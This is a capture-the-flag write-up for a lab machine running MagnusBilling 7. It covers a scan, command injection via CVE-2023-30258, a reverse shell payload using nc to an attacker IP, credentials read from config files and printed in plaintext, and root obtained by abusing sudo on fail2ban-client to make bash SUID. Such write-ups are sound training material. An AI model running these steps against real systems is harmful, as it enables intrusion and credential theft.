## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Some mistakes can be costly.
Gain a shell, find the way and escalate your privileges!

**Note:** Bruteforcing is out of scope for this room.
```
## IP-Address
```IP
10.49.180.86
```
## Scan
```bash
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 62 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey:
|   256 78:8e:87:94:13:f0:d4:93:71:a7:b3:62:08:ab:49:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHYWIvQivqyn1ao3QOcCXpD+85vB7T36CLlSTUE0fbt00kK3O1f8GIOaPJgUAS7eBQ7VV5fz7yMpcUI3BnYE4UA=
|   256 bc:f1:1b:c1:73:cc:57:3e:55:bd:dd:8d:01:ff:96:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHq/GYlulKDVEXfq8ppjFfYNZjtjJvn2ZbxIt59OV19N
80/tcp   open  http     syn-ack ttl 62 Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-title:             MagnusBilling
|_Requested resource was http://10.48.137.151/mbilling/
| http-robots.txt: 1 disallowed entry
|_/mbilling/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql    syn-ack ttl 62 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 62 Asterisk Call Manager 2.10.6
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```
## Enumeration 
- Browse Port `80` - mbilling
```bash
http://10.49.180.86/mbilling 
http://10.49.180.86/mbilling/LICENSE
http://10.49.180.86/mbilling/README.md
http://10.49.180.86/mbilling/archive http://10.49.180.86/mbilling/assets 
http://10.49.180.86/mbilling/fpdf 
```
- README.md
```txt
###############
MagnusBilling 7 
###############
Do you like this software? Star the project and become a [stargazer](https://github.com/magnussolution/magnusbilling7/stargazers).
# MagnusBilling 7
Voip sistem to Asterisk.
## Getting Started
Video:
* [How to install MagnusBilling](https://www.youtube.com/watch?v=X3cj-dZPZHU)
* [How to set-up basic configuration and make your first call](https://www.youtube.com/watch?v=7r1XCJnfdZA&t=73s)
### Prerequisites
Linux Debian 11 or Centos 7. Recomended DEBIAN 11
### Installing
curl -O https://raw.githubusercontent.com/magnussolution/magnusbilling7/source/script/install.sh
bash install.sh
## Built With
* [YiiFramework](http://www.yiiframework.com) - The BackEnd framework used
* [EXTJS6](https://www.sencha.com/products/extjs) - The FrontEnd framework used
* [ASTERISK](http://www.asterisk.org) - Telephone freamwork
## Contributing
Please read [CONTRIBUTING.md](https://github.com/magnussolution/magnusbilling7/blob/source/CONTRIBUTING.md) for details on our code of conduct, and the process for submitting pull requests to us.
## Versioning
We are in MagnusBilling version 7.x.x 
## Authors=
* **Adilson Magnus** - *Initial work* - [MagnusSolution](https://magnussolution.com)
See also the list of [contributors](https://github.com/magnussolution/magnusbilling7/contributors) who participated in this project.
## License
This project is licensed under the GPL3 License
Free Support
--------------------------------------
We provide several avenues for you to get your system up and running on your own and learn the basics of the system.
1. [Youtube Channel](https://www.youtube.com/channel/UCish_6Lxfkh29n4CLVEd90Q)
2. [Documentation](https://magnusbilling.org) Menu Documentation
3. [Telegram Group(English)](https://t.me/joinchat/NXwoZRPGpG6rPqp3yssLzQ)
4. [Telegram Grupo(Spanish)](https://t.me/joinchat/NXwoZRXQbjokWrliVGObkQ)
5. [Telegram Grupo(PortuguÃªs)](https://t.me/joinchat/NXwoZQtJRKN-5e03uY6_XQ)
```
---
- Version - `MagnusBilling version 7.x.x `
- Found Vulnerability related to `MagnusBilling` - 
`CVE-2023-30258` 
```bash
$ python3 exploit.py -t 10.49.180.86 -a 192.168.157.252 -p 4444
=== Magnus Billing System v7 Exploit by Tinashe Matanda(SadNinja) ===
Command Injection via icepay.php - Reverse Shell
=======================================
[+] Targeting: http://10.49.180.86/mbilling/lib/icepay/icepay.php
[+] Attacker: 192.168.157.252:4444
[+] Sending payload: ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.157.252 4444 >/tmp/f;
[-] Error connecting to target: HTTPConnectionPool(host='10.49.180.86', port=80): Read timed out. (read timeout=5)
```
- Got the Shell
```bash
$ whoami
asterisk
$ cd /home
$ ls
debian
magnus
ssm-user
$ cd magnus
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
$ cat user.txt
[flag omitted]
```
- Look for SSH Credentials
```bash
$ cd /var/www/html/mbilling/protected
$ ls -la
total 52
dr-xr-xr-x 10 root     root      4096 Sep 13  2024 .
dr-xr-xr-x 36 asterisk asterisk  4096 Sep 12  2024 ..
-r-xr-xr-x  1 root     root        15 Sep 12  2024 .htaccess
dr-xr-xr-x  2 root     root      4096 Sep 12  2024 commands
dr-xr-xr-x  2 root     root      4096 Sep 12  2024 components
dr-xr-xr-x  2 root     root      4096 Sep 12  2024 config
dr-xr-xr-x  3 root     root     12288 Sep 12  2024 controllers
dr-xr-xr-x  6 root     root      4096 Sep 12  2024 extensions
dr-xr-xr-x  2 root     root      4096 Sep 12  2024 models
drwxr-xr--  2 asterisk asterisk  4096 Sep 12  2024 runtime
dr-xr-xr-x 14 root     root      4096 Sep 12  2024 views
$ cd config
$ ls -la
total 24
dr-xr-xr-x  2 root root 4096 Sep 12  2024 .
dr-xr-xr-x 10 root root 4096 Sep 13  2024 ..
-r-xr-xr-x  1 root root 2713 Sep 12  2024 cron_production.php
-r-xr-xr-x  1 root root 3351 Sep 12  2024 main.php
-r-xr-xr-x  1 root root 3351 Sep 12  2024 main_production.php
-r-xr-xr-x  1 root root  759 Sep 12  2024 permissions.php
$ cat main.php
<?php
/**
 * =======================================
 * ###################################
 * MagnusBilling
 *
 * @package MagnusBilling
 * @author Adilson Leffa Magnus.
 * @copyright Copyright (C) 2005 - 2023 MagnusSolution. All rights reserved.
 * ###################################
 *
 * This software is released under the terms of the GNU Lesser General Public License v2.1
 * A copy of which is available from http://www.gnu.org/copyleft/lesser.html
 *
 * Please submit bug reports, patches, etc to https://github.com/magnusbilling/mbilling/issues
 * =======================================
 * Magnusbilling.com <info@magnusbilling.com>
 *
 */
$configFile = '/etc/asterisk/res_config_mysql.conf';
$array      = parse_ini_file($configFile);

return [
    'basePath'   => dirname(__FILE__) . DIRECTORY_SEPARATOR . '..',
    'name'       => 'MagnusBilling',
    'preload'    => ['log'],
    # autoload das models e componentes
    'import'     => [
        'application.models.*',
        'application.components.*',
        'application.components.AGI.*',
        'ext.yii-mail.YiiMailMessage',
        'ext.phpAGI.AGI',
        'ext.phpAGI.AGI_AsteriskManager',
        'ext.fpdf.FPDF',
    ],
    # application components
    'components' => [
        # criacao de urls amigaveis
        'urlManager'   => [
            'urlFormat' => 'path',
            'rules'     => [
                '<controller:\w+>/<id:\d+>'              => '<controller>/view',
                '<controller:\w+>/<action:\w+>/<id:\d+>' => '<controller>/<action>',
                '<controller:\w+>/<action:\w+>'          => '<controller>/<action>',
            ],
        ],
        'mail'         => [
            'class'            => 'ext.yii-mail.YiiMail',
            'transportType'    => 'smtp',
            'transportOptions' => [
                'host'       => '',
                'encryption' => '',
                'username'   => '',
                'password'   => '',
                'port'       => '',
                'encryption' => '',
            ],
            'viewPath'         => 'application.views.mails',
            'logging'          => true,
            'dryRun'           => false,
        ],
        # configuracao da conexao com banco de dados
        'db'           => [
            'connectionString' => 'mysql:host=' . $array['dbhost'] . ';dbname=' . $array['dbname'] . '',
            'emulatePrepare'   => true,
            'username'         => $array['dbuser'],
            'password'         => $array['dbpass'],
            'charset'          => 'utf8',
            'attributes'       => [
                PDO::MYSQL_ATTR_LOCAL_INFILE => true,
            ],
            //'enableProfiling' => true,
        ],
        'coreMessages' => [
            'basePath' => 'resources/locale/php',
        ],
        # exibicao dos logs de erro
        'log'          => [
            'class'  => 'CLogRouter',
            'routes' => [
                [
                    'class'  => 'CFileLogRoute',
                    'levels' => 'error, fatal',
                ],
                # desabilitar para exibir logs da aplicacao

                /*array(
            'class'=>'CWebLogRoute',
            ),*/

            ],
        ],
        'cache'        => [
            'class' => 'system.caching.CDbCache',
        ],
    ],
];
```
- Got the Config File Path `/etc/asterisk/res_config_mysql.conf`
```bash
$ cat /etc/asterisk/res_config_mysql.conf
[general]
dbhost = 127.0.0.1
dbname = mbilling
dbuser = mbillingUser
dbpass = BLOGYwvtJkI7uaX5
```
- Lets get inside `mysql-db`
- `MYSQL` isn't Working in this room, Focus on other approach 
```bash
$ whoami
asterisk
$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
$ sudo -l
Matching Defaults entries for asterisk on ip-10-48-156-74:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-48-156-74:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
-----
### Privilege Escalation
```bash
asterisk@ip-10-48-156-74:/var/www/html/mbilling$ cat /var/www/html/mbilling/resources/ip.blacklist
asterisk@ip-10-48-156-74:/var/www/html/mbilling$ sudo -l
Matching Defaults entries for asterisk on ip-10-48-156-74:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-48-156-74:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
- Search about the `fail2ban` and looked for the ban `IP-table` that file can be writeable
- Created the exploit and Run
```bash
asterisk@ip-10-48-156-74:/var/www/html/mbilling$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'chmod +s /bin/bash'"
/bin/bash -c 'chmod +s /bin/bash'
asterisk@ip-10-48-156-74:/var/www/html/mbilling$ sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
1
asterisk@ip-10-48-156-74:/var/www/html/mbilling$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# ls
filename  passwordMysql.log  root.txt
bash-5.2# cat passswordMysql.log
cat: passswordMysql.log: No such file or directory
bash-5.2# cat passwordMysql.log
MgnodcVwGxW0xLUN
bash-5.2# cat root.txt
[flag omitted]
```
- Got the Root and Root/Flag
---
## Flags
```Flag
User - [flag omitted]
Root - [flag omitted]
```
# END